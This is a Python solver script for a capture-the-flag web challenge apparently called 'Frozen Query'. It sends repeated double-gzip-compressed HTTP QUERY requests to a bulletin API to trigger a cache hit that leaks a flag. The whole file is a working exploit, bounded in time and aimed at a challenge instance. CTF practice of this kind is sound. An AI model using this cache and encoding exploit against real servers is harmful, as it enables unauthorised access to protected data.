#!/usr/bin/env python3
"""Frozen Query double-gzip cache hit — original reconstruction.

Usage: pip install requests
       python3 solve.py https://YOUR-CHALLENGE-INSTANCE --seconds 20
No network traffic unless a URL is explicitly provided.

Derived independently from the published D23R walk-through, NOT the
participant's lost original solver.
"""
import argparse
import gzip
import json
import time

def main():
    p=argparse.ArgumentParser()
    p.add_argument("url",help="Base URL for an authorized CTF instance")
    p.add_argument("--seconds",type=float,default=20)
    p.add_argument("--delay",type=float,default=0.4)
    args=p.parse_args()
    import requests
    endpoint=args.url.rstrip("/")+"/api/bulletin"
    end=time.monotonic()+args.seconds
    headers={"Content-Type":"application/vnd.glacier.bulletin+json",
             "Accept":"application/json",
             "Content-Encoding":"gzip, gzip"}
    with requests.Session() as session:
        while time.monotonic()<end:
            now=int(time.time()//30)
            body=json.dumps({"region":"summit","fields":["level","note","flag"],"window":now}).encode()
            payload=gzip.compress(gzip.compress(body))
            try:
                r=session.request("QUERY",endpoint,data=payload,headers=headers,timeout=5)
                print("HTTP",r.status_code,"X-Cache",r.headers.get("X-Cache"),"window",now)
                if r.ok:
                    data=r.json()
                    if data.get("region")=="summit" and "flag" in data:
                        print("summit bulletin received, flag-shaped:",str(data["flag"]).startswith("gctf{"))
                        if data["flag"]=="gctf{FAKE_FAKE_FAKE_FAKE_FAKE_FAKE}":
                            print("This is the organizer's fake local flag.")
                        return
            except requests.RequestException as e:
                print("request:",type(e).__name__)
            time.sleep(args.delay)
    raise SystemExit("Cache hit not seen in bounded retry window")

if __name__=="__main__":
    main()
